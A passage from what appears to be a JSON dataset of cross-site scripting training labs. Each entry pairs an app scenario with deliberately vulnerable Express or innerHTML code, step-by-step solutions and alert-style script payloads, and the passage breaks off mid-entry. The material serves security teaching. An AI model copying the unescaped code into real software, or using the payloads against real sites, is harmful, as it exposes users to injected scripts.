        "Lab Description": "Applicants submit notes with their job applications. These notes are stored and displayed to HR without sanitization. To solve: Inject a payload into the notes field.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit application with <script>alert('Applicant')</script> in notes.",
            "Log in as HR and review submissions.",
            "Observe script execution in notes display.",
            "Test alternative payload formats.",
            "Verify execution persists after session change."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/apply', (req, res) => { const notes = req.body.notes; db.query(\"INSERT INTO applications (notes) VALUES (?)\", [notes]); res.redirect('/jobs'); });",
        "payloads": [
            "<script>alert('Applicant')</script>",
            "<img src=x onerror=alert('HR')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in e-commerce coupon validation field",
        "Lab Description": "The coupon code entry box reflects invalid codes in a response message without escaping, enabling reflected XSS. To solve: Inject a payload in the coupon parameter.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Use URL: /check-coupon?code=<script>alert('XSS')</script>",
            "Observe response showing the payload.",
            "Test via Burp Suite with other payloads.",
            "Confirm execution in confirmation HTML.",
            "Try %3Cscript%3E encoded form."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const app = express(); app.get('/check-coupon', (req, res) => { const code = req.query.code; res.send(`<p>Coupon ${code} is not valid.</p>`); });",
        "payloads": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('Coupon')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in virtual classroom announcement field",
        "Lab Description": "Teachers post announcements to students. These are saved and displayed without escaping, leading to stored XSS. To solve: Submit a malicious script in the announcement field.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Post: <script>alert('Class')</script> as announcement.",
            "Student logs in and views dashboard.",
            "Script executes in their browser.",
            "Test SVG or onerror payloads.",
            "Validate persistence across logins."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/post-announcement', (req, res) => { const msg = req.body.message; db.query(\"INSERT INTO announcements (text) VALUES (?)\", [msg]); res.redirect('/dashboard'); });",
        "payloads": [
            "<script>alert('Class')</script>",
            "<svg/onload=alert('School')>"
        ]
    },
    {
        "Lab scenario": "DOM-based XSS in product rating widget",
        "Lab Description": "The product rating widget loads dynamic values from sessionStorage and injects them into the DOM using innerHTML. Lack of sanitization leads to DOM-based XSS. To solve: Inject a payload into sessionStorage.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "sessionStorage.rating = '<img src=x onerror=alert(555)>';",
            "Reload product page and check rating section.",
            "Observe execution in DOM area.",
            "Test with <iframe> or encoded content.",
            "Validate it runs on other products."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "document.getElementById('rating').innerHTML = sessionStorage.rating;",
        "payloads": [
            "<img src=x onerror=alert(555)>",
            "<svg onload=alert('Rate')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in team feedback tool message board",
        "Lab Description": "The feedback board accepts anonymous messages from employees. These messages are stored and displayed to management without escaping, creating a stored XSS vector. To solve: Submit XSS payload in message field.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit message: <script>alert('Feedback')</script>.",
            "Manager logs in and views message board.",
            "Script executes in browser.",
            "Test variants using onmouseover.",
            "Confirm execution after page reload."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/submit-message', (req, res) => { const msg = req.body.message; db.query(\"INSERT INTO feedback (content) VALUES (?)\", [msg]); res.redirect('/board'); });",
        "payloads": [
            "<script>alert('Feedback')</script>",
            "<img src=x onerror=alert('Board')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in newsletter signup confirmation",
        "Lab Description": "The newsletter system reflects the 'name' field back into the HTML of the confirmation page, without escaping. To solve: Inject an alert script in the name field.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Use /subscribe?name=<script>alert('Mail')</script>",
            "Observe execution on confirmation page.",
            "Try using %3Cscript%3E encoding.",
            "Verify if payload is reflected directly in HTML.",
            "Confirm behavior in incognito."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const app = express(); app.get('/subscribe', (req, res) => { const name = req.query.name; res.send(`<p>Thanks ${name} for subscribing!</p>`); });",
        "payloads": [
            "<script>alert('Mail')</script>",
            "<svg onload=alert('Newsletter')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in real estate listing title",
        "Lab Description": "Real estate agents can add property listings with titles. These are shown on public pages. Lack of output encoding results in stored XSS. To solve: Inject a payload in the listing title.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Add listing with title: <script>alert('House')</script>.",
            "Visit public listings page.",
            "Observe JavaScript execution.",
            "Use Burp Suite to test with image-based payloads.",
            "Confirm visibility to unauthenticated users."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/new-listing', (req, res) => { const title = req.body.title; db.query(\"INSERT INTO listings (title) VALUES (?)\", [title]); res.redirect('/listings'); });",
        "payloads": [
            "<script>alert('House')</script>",
            "<img src=x onerror=alert('Listing')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in online event registration form comment",
        "Lab Description": "The event registration form allows users to leave comments that are displayed on the event page. The input is stored without sanitization, leading to a stored XSS vulnerability. To solve: Inject a payload in the comment field and trigger execution.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit a registration with comment: <script>alert('Event')</script>.",
            "Open the event page and check registered users' comments.",
            "Observe execution of the script in browser.",
            "Try alternate payloads for filter evasion.",
            "Ensure persistence after reload."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/register', (req, res) => { const comment = req.body.comment; db.query(\"INSERT INTO registrations (comment) VALUES (?)\", [comment]); res.redirect('/event'); });",
        "payloads": [
            "<script>alert('Event')</script>",
            "<img src=x onerror=alert('XSS')>"
        ]
    },
    {
        "Lab scenario": "DOM-based XSS via comment preview system",
        "Lab Description": "The application displays a live preview of comments using innerHTML from an input field. It fails to sanitize content, resulting in a DOM-based XSS. To solve: Inject a script into the comment box and observe live execution.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Enter: <img src=x onerror=alert('Preview')> in comment field.",
            "Check the live preview panel for execution.",
            "Use DevTools to inspect DOM behavior.",
            "Try obfuscated payloads.",
            "Confirm no escaping is applied."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "document.getElementById('preview').innerHTML = document.getElementById('input').value;",
        "payloads": [
            "<img src=x onerror=alert('Preview')>",
            "<svg onload=alert('Live')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in hotel booking special requests field",
        "Lab Description": "Guests can submit special requests during hotel booking. These requests are shown to staff without escaping, allowing persistent script execution. To solve: Inject XSS payload in the request field.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Book a room with: <script>alert('Room')</script> as request.",
            "Login as hotel staff and view booking details.",
            "Observe script execution in request section.",
            "Use alternative payload formats.",
            "Test if the payload runs without login."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/book', (req, res) => { const request = req.body.request; db.query(\"INSERT INTO bookings (request) VALUES (?)\", [request]); res.redirect('/confirmation'); });",
        "payloads": [
            "<script>alert('Room')</script>",
            "<img src=x onerror=alert('Hotel')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in failed login message",
        "Lab Description": "Failed login attempts return the submitted username in an error message without encoding. This allows reflected XSS. To solve: Inject JavaScript via the username field.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Enter username: <script>alert('Login')</script> and any password.",
            "Submit and observe the error message.",
            "Check DOM response for script execution.",
            "Use encoded forms for bypassing filters.",
            "Try SVG and onerror payloads."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/login', (req, res) => { const username = req.body.username; res.send(`<p>Login failed for ${username}</p>`); });",
        "payloads": [
            "<script>alert('Login')</script>",
            "<img src=x onerror=alert('LoginXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in event scheduler notes field",
        "Lab Description": "Users can schedule meetings and leave notes. These notes are rendered for all attendees without sanitization. To solve: Inject an XSS payload in the notes.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Schedule a meeting with: <script>alert('Note')</script> as notes.",
            "Join meeting as different user.",
            "Observe alert on the scheduler view.",
            "Test variations of payloads.",
            "Validate persistence in session."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/schedule', (req, res) => { const note = req.body.note; db.query(\"INSERT INTO events (note) VALUES (?)\", [note]); res.redirect('/calendar'); });",
        "payloads": [
            "<script>alert('Note')</script>",
            "<svg onload=alert('Calendar')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in article share preview link",
        "Lab Description": "The article preview page displays a shared title passed in via the URL. No escaping is performed before rendering. To solve: Inject script into the title parameter.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Visit /preview?title=<script>alert('Share')</script>",
            "Observe title rendered in DOM.",
            "Test encoded and tag-wrapped payloads.",
            "Use DevTools to view reflection.",
            "Ensure execution on page load."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const app = express(); app.get('/preview', (req, res) => { const title = req.query.title; res.send(`<h1>${title}</h1>`); });",
        "payloads": [
            "<script>alert('Share')</script>",
            "<svg onload=alert('Preview')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in survey platform question title",
        "Lab Description": "Survey creators can define question titles. These are shown to respondents without escaping, allowing persistent XSS. To solve: Inject a script in the title.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Create question with title: <script>alert('Survey')</script>.",
            "Preview the survey as a respondent.",
            "Observe the script execution.",
            "Test with <img> and event-based tags.",
            "Confirm behavior across accounts."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/create-question', (req, res) => { const title = req.body.title; db.query(\"INSERT INTO questions (title) VALUES (?)\", [title]); res.redirect('/survey'); });",
        "payloads": [
            "<script>alert('Survey')</script>",
            "<img src=x onerror=alert('Poll')>"
        ]
    },
    {
        "Lab scenario": "DOM-based XSS in QR code label renderer",
        "Lab Description": "QR label content is fetched from `localStorage` and rendered directly with innerHTML in the QR page. No sanitization is done. To solve: Inject payload into localStorage.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Set localStorage.label = '<script>alert(\"QR\")</script>';",
            "Reload the QR generator page.",
            "Check execution in label area.",
            "Try encoded event-based payloads.",
            "Confirm if DOM parsing triggers JS."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "document.getElementById('qr-label').innerHTML = localStorage.label;",
        "payloads": [
            "<script>alert('QR')</script>",
            "<svg onload=alert('Code')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in healthcare appointment notes",
        "Lab Description": "Patients can leave notes when scheduling appointments. These are shown to doctors without sanitization, enabling persistent XSS. To solve: Inject a script into notes field.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Schedule appointment with note: <script>alert('Doctor')</script>.",
            "Doctor logs in and views schedule.",
            "Script executes in their browser.",
            "Test persistence after multiple views.",
            "Confirm filter evasion with <img>."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/appointment', (req, res) => { const note = req.body.note; db.query(\"INSERT INTO appointments (note) VALUES (?)\", [note]); res.redirect('/appointments'); });",
        "payloads": [
            "<script>alert('Doctor')</script>",
            "<img src=x onerror=alert('Health')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in blog author search page",
        "Lab Description": "The blog search page echoes the query back in the heading. No sanitization is applied. To solve: Inject a payload in the search parameter.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Visit /search-author?query=<script>alert('Blogger')</script>",
            "Observe reflection in heading.",
            "Use encoded or tag-wrapped scripts.",
            "Confirm alert on page load.",
            "Test across user agents."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const app = express(); app.get('/search-author', (req, res) => { const query = req.query.query; res.send(`<h3>Results for ${query}</h3>`); });",
        "payloads": [
            "<script>alert('Blogger')</script>",
            "<svg onload=alert('Author')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in freelance platform project description",
        "Lab Description": "Freelancers submit project descriptions visible to clients. The app stores and renders the description without sanitization. To solve: Inject a persistent XSS payload in the project description field.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit a new project with <script>alert('Freelance')</script> in the description.",
            "Login as a client and view the project listing.",
            "Observe script execution on project detail view.",
            "Try variations using different HTML tags.",
            "Ensure it triggers on every client view."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/submit-project', (req, res) => { const desc = req.body.description; db.query(\"INSERT INTO projects (description) VALUES (?)\", [desc]); res.redirect('/projects'); });",
        "payloads": [
            "<script>alert('Freelance')</script>",
            "<img src=x onerror=alert('ProjectXSS')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in live price quote tool",
        "Lab Description": "A live price estimator displays user input directly in the response page. There's no encoding of the value, allowing reflected XSS. To solve: Inject a script via the quote input.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Go to /quote?amount=<script>alert('Quote')</script>",
            "Observe reflection and script execution.",
            "Try other inputs like onmouseover or SVG.",
            "Confirm alert appears without login.",
            "Verify against multiple browsers."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const app = express(); app.get('/quote', (req, res) => { const amount = req.query.amount; res.send(`<p>Estimated cost: ${amount}</p>`); });",
        "payloads": [
            "<script>alert('Quote')</script>",
            "<svg onload=alert('QuoteXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in internship portal resume summary",
        "Lab Description": "Interns upload resume summaries that are displayed to companies. The summary field is vulnerable to stored XSS. To solve: Submit a script as part of the resume summary.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Login as intern and upload resume with <script>alert('Intern')</script> in summary.",
            "Login as company and view applicant details.",
            "Observe alert on resume view.",
            "Test different payload formats.",
            "Ensure script runs without clicking anything."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/upload-resume', (req, res) => { const summary = req.body.summary; db.query(\"INSERT INTO resumes (summary) VALUES (?)\", [summary]); res.redirect('/internships'); });",
        "payloads": [
            "<script>alert('Intern')</script>",
            "<img src=x onerror=alert('ResumeXSS')>"
        ]
    },
    {
        "Lab scenario": "DOM-based XSS in user greeting message",
        "Lab Description": "The dashboard uses query parameters to greet users by name. The value is inserted with innerHTML without sanitization. To solve: Inject a payload via the query string.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Visit: /dashboard.html?name=<img src=x onerror=alert('Greet')>",
            "Check the greeting section for script execution.",
            "Use DevTools to confirm unsafe insertion.",
            "Test encoded forms of script.",
            "Validate on reload and navigation."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const params = new URLSearchParams(window.location.search); document.getElementById('greeting').innerHTML = `Hello, ${params.get('name')}`;",
        "payloads": [
            "<img src=x onerror=alert('Greet')>",
            "<svg onload=alert('DOMXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in peer review portal feedback box",
        "Lab Description": "Students review each other's work and leave feedback. Feedback is displayed to others without escaping, resulting in persistent XSS. To solve: Inject JavaScript into the feedback box.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit peer feedback with <script>alert('Review')</script>.",
            "Login as another user and view the review list.",
            "Observe payload execution.",
            "Try alternate payload variants.",
            "Confirm persistence across reloads."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/submit-review', (req, res) => { const feedback = req.body.feedback; db.query(\"INSERT INTO reviews (text) VALUES (?)\", [feedback]); res.redirect('/peer-feedback'); });",
        "payloads": [
            "<script>alert('Review')</script>",
            "<img src=x onerror=alert('FeedbackXSS')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in language selection parameter",
        "Lab Description": "The application accepts a `lang` parameter and displays it as a label. It doesn't sanitize the value, enabling reflected XSS. To solve: Inject a script via the lang parameter.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Visit /select-lang?lang=<script>alert('Lang')</script>",
            "Observe label rendering in HTML.",
            "Confirm script execution on load.",
            "Try different encoding methods.",
            "Validate in various browsers."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const app = express(); app.get('/select-lang', (req, res) => { const lang = req.query.lang; res.send(`<p>Language: ${lang}</p>`); });",
        "payloads": [
            "<script>alert('Lang')</script>",
            "<img src=x onerror=alert('LangXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in job posting platform cover letter",
        "Lab Description": "Applicants write cover letters that are displayed to recruiters. No escaping is applied to the letter content, allowing stored XSS. To solve: Inject script in the letter.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit application with <script>alert('Cover')</script> as cover letter.",
            "Login as recruiter and view application.",
            "Observe alert on load.",
            "Try encoded variations.",
            "Test in different browser agents."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/apply-job', (req, res) => { const letter = req.body.letter; db.query(\"INSERT INTO applications (letter) VALUES (?)\", [letter]); res.redirect('/job-board'); });",
        "payloads": [
            "<script>alert('Cover')</script>",
            "<svg onload=alert('JobXSS')>"
        ]
    },
    {
        "Lab scenario": "DOM-based XSS in real-time analytics viewer",
        "Lab Description": "User input is appended to the live stats label via innerHTML without sanitization. This allows DOM-based XSS. To solve: Inject a malicious value and watch for execution.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Enter <img src=x onerror=alert('Stat')> into analytics label field.",
            "Observe DOM update via script execution.",
            "Try using encoded payloads.",
            "Test on multiple refreshes.",
            "Confirm live analytics are affected."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "document.getElementById('stats').innerHTML = document.getElementById('input').value;",
        "payloads": [
            "<img src=x onerror=alert('Stat')>",
            "<svg onload=alert('LiveXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in profile experience section",
        "Lab Description": "Users can add professional experience to their profile. The description field is stored and displayed without escaping, allowing XSS. To solve: Inject JavaScript into the experience field.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Edit profile and add experience: <script>alert('Exp')</script>.",
            "Visit public profile page.",
            "Observe alert triggered on load.",
            "Try onerror, onclick and other variants.",
            "Test visibility to other users."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/add-experience', (req, res) => { const exp = req.body.exp; db.query(\"INSERT INTO experience (details) VALUES (?)\", [exp]); res.redirect('/profile'); });",
        "payloads": [
            "<script>alert('Exp')</script>",
            "<img src=x onerror=alert('ProfileXSS')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in support contact confirmation page",
        "Lab Description": "User input from the contact form is reflected in the confirmation response. There’s no sanitization, making it vulnerable to reflected XSS. To solve: Inject JavaScript via the name field.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit contact form with name: <script>alert('Support')</script>",
            "Observe it reflected in confirmation page.",
            "Check for immediate script execution.",
            "Try multiple payload forms.",
            "Verify filter behavior."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/contact', (req, res) => { const name = req.body.name; res.send(`<p>Thank you ${name}</p>`); });",
        "payloads": [
            "<script>alert('Support')</script>",
            "<svg onload=alert('ContactXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in online course description",
        "Lab Description": "The course creation page allows instructors to enter rich descriptions. The input is stored and rendered without escaping. To solve: Inject a script in the course description field.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Login as instructor and create a course with <script>alert('CourseXSS')</script> in description.",
            "Open course as a student.",
            "Observe script execution.",
            "Try variations in HTML context.",
            "Ensure it persists across sessions."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/create-course', (req, res) => { const desc = req.body.description; db.query(\"INSERT INTO courses (description) VALUES (?)\", [desc]); res.redirect('/courses'); });",
        "payloads": [
            "<script>alert('CourseXSS')</script>",
            "<img src=x onerror=alert('Course')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in calendar event preview",
        "Lab Description": "A calendar tool shows event previews from query parameters. The input is not encoded, allowing reflected XSS. To solve: Inject a script in the title parameter.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Access /event-preview?title=<script>alert('Event')</script>",
            "Check if script is executed.",
            "Inspect HTML source for injection point.",
            "Try encoded payloads.",
            "Ensure it works without login."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const app = express(); app.get('/event-preview', (req, res) => { const title = req.query.title; res.send(`<h3>Event: ${title}</h3>`); });",
        "payloads": [
            "<script>alert('Event')</script>",
            "<svg onload=alert('Calendar')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in travel portal trip notes",
        "Lab Description": "Travelers can add personal notes for trips. These notes are rendered on trip pages without sanitization. To solve: Inject a persistent script in the notes field.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Create a trip and add note: <script>alert('Trip')</script>.",
            "Access trip details from another account.",
            "Observe script execution.",
            "Try onerror and SVG payloads.",
            "Verify persistence in DB."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/add-note', (req, res) => { const note = req.body.note; db.query(\"INSERT INTO notes (text) VALUES (?)\", [note]); res.redirect('/trips'); });",
        "payloads": [
            "<script>alert('Trip')</script>",
            "<img src=x onerror=alert('NoteXSS')>"
        ]
    },
    {
        "Lab scenario": "DOM XSS in online invoice viewer footer",
        "Lab Description": "The invoice viewer reads a footer note from localStorage and injects it via innerHTML. To solve: Add a malicious footer value in localStorage.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Run: localStorage.setItem('footer','<img src=x onerror=alert(\"Invoice\")>')",
            "Reload invoice view page.",
            "Watch footer for script execution.",
            "Try encoded payloads.",
            "Verify effect across sessions."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "document.getElementById('footer').innerHTML = localStorage.getItem('footer');",
        "payloads": [
            "<img src=x onerror=alert(\"Invoice\")>",
            "<svg onload=alert('InvoiceXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in book review system",
        "Lab Description": "Users submit reviews on books, which are rendered to the public. The content is displayed without escaping, enabling stored XSS. To solve: Inject a payload into the review form.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit a book review with <script>alert('Book')</script>.",
            "Visit the book’s page.",
            "Observe XSS execution.",
            "Use Burp to confirm DB storage.",
            "Ensure it triggers for all viewers."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/submit-review', (req, res) => { const content = req.body.content; db.query(\"INSERT INTO reviews (text) VALUES (?)\", [content]); res.redirect('/books'); });",
        "payloads": [
            "<script>alert('Book')</script>",
            "<img src=x onerror=alert('ReviewXSS')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in poll results summary",
        "Lab Description": "The app displays submitted poll answers in the URL response. The input is reflected into the DOM without sanitization. To solve: Inject a payload into the answer parameter.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Go to /poll-summary?answer=<svg onload=alert('Poll')>",
            "Observe execution in the summary page.",
            "Confirm location of injection.",
            "Try onmouseover-based payloads.",
            "Validate through DevTools."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const app = express(); app.get('/poll-summary', (req, res) => { const answer = req.query.answer; res.send(`<div>${answer}</div>`); });",
        "payloads": [
            "<svg onload=alert('Poll')>",
            "<script>alert('PollResult')</script>"
        ]
    },
    {
        "Lab scenario": "DOM-based XSS in CRM user greeting",
        "Lab Description": "The CRM dashboard personalizes greetings using location.hash. It writes the name using innerHTML. To solve: Inject a malicious fragment to execute JavaScript.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Visit /crm.html#<img src=x onerror=alert('CRM')>",
            "Reload page and observe greeting behavior.",
            "Check DOM for unsafe HTML insertion.",
            "Try different fragment-based payloads.",
            "Ensure no backend validation."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "document.getElementById('welcome').innerHTML = location.hash.substring(1);",
        "payloads": [
            "<img src=x onerror=alert('CRM')>",
            "<svg/onload=alert('HashXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in newsletter platform welcome message",
        "Lab Description": "Newsletter creators can write custom welcome messages. These are rendered to subscribers without sanitization. To solve: Inject XSS payload in the welcome text.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Create a newsletter with welcome: <script>alert('Newsletter')</script>",
            "Subscribe with a test account.",
            "Observe welcome page behavior.",
            "Test innerHTML updates and DOM injection.",
            "Confirm that new users see the payload."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/create-welcome', (req, res) => { const message = req.body.message; db.query(\"INSERT INTO welcomes (text) VALUES (?)\", [message]); res.redirect('/newsletter'); });",
        "payloads": [
            "<script>alert('Newsletter')</script>",
            "<img src=x onerror=alert('WelcomeXSS')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in booking confirmation page",
        "Lab Description": "Booking details are reflected in the confirmation page using URL parameters. The input is not encoded properly. To solve: Inject JavaScript via the 'name' parameter.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Visit /booking?name=<script>alert('Booking')</script>",
            "Check how name is rendered in confirmation.",
            "Observe payload execution.",
            "Try SVG/onerror-based payloads.",
            "Verify across browsers."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const app = express(); app.get('/booking', (req, res) => { const name = req.query.name; res.send(`<h1>Booking confirmed for ${name}</h1>`); });",
        "payloads": [
            "<script>alert('Booking')</script>",
            "<img src=x onerror=alert('ConfirmXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in code snippet sharing site",
        "Lab Description": "Users can publish code snippets that get rendered on a shared page. There's no escaping of user input, allowing stored XSS. To solve: Submit a snippet with a payload.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit a snippet: <script>alert('Snippet')</script>",
            "Access the shared view page.",
            "Observe payload execution.",
            "Use DevTools to confirm raw HTML rendering.",
            "Test encoded and obfuscated forms."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/submit-snippet', (req, res) => { const code = req.body.code; db.query(\"INSERT INTO snippets (content) VALUES (?)\", [code]); res.redirect('/snippets'); });",
        "payloads": [
            "<script>alert('Snippet')</script>",
            "<svg onload=alert('ShareXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in event manager speaker bio",
        "Lab Description": "Organizers can add speaker bios, which are shown on the event page without escaping HTML. To solve: Inject a script in the bio field and trigger it from the speaker page.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Login as organizer and submit speaker bio with <script>alert('BioXSS')</script>.",
            "Open the event page.",
            "Observe script execution.",
            "Confirm persistence and cross-user visibility.",
            "Try obfuscated payloads."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.post('/add-speaker', (req, res) => { const bio = req.body.bio; db.query(\"INSERT INTO speakers (bio) VALUES (?)\", [bio]); res.redirect('/speakers'); });",
        "payloads": [
            "<script>alert('BioXSS')</script>",
            "<img src=x onerror=alert('Speaker')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in e-commerce gift message preview",
        "Lab Description": "The app lets users preview gift messages, but reflects user input without sanitization. To solve: Inject a script in the message parameter and observe execution.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Access /preview-message?msg=<script>alert('Gift')</script>",
            "Observe execution in preview.",
            "Check DOM location of injection.",
